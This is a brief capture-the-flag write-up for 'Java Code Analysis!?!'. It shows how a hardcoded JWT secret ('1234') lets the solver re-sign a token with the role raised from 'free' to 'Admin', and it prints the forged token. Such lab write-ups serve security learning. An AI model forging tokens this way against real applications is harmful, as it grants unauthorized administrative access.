# Java Code Analysis!?!

## Description
This write up will show how to solve the CTF for "Java Code Analysis!?!"

## Solution
The web page creates an auth-token, which looks like an JWT-token.</br>
Entering this in `jwt.io` gives the following result:</br>
```
{
  "role": "free",
  "iss": "bookshelf",
  "exp": 1701903525,
  "iat": 1701298725,
  "userId": 1,
  "email": "user"
}
```

In the code it states that the secret key is `1234`, give that also in JWT.</br>

Changes the above data to:</br>
```
{
  "role": "Admin",
  "iss": "bookshelf",
  "exp": 1701903525,
  "iat": 1701298725,
  "userId": 2,
  "email": "admin"
}
```

This generates the following auth-token:</br>
`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3MDE5MDM1MjUsImlhdCI6MTcwMTI5ODcyNSwidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.n8iE7xu0vC8CZgiksSWFBskcMQCAs6zq2kFGDzO70rU`
And the following token-payload:</br>
```
{
  "role": "Admin",
  "iss": "bookshelf",
  "exp": 1701903525,
  "iat": 1701298725,
  "userId": 2,
  "email": "admin"
}
```

In the browser, replace the auth-token and the token-payload with the above data, refresh the page and it will show the flag.
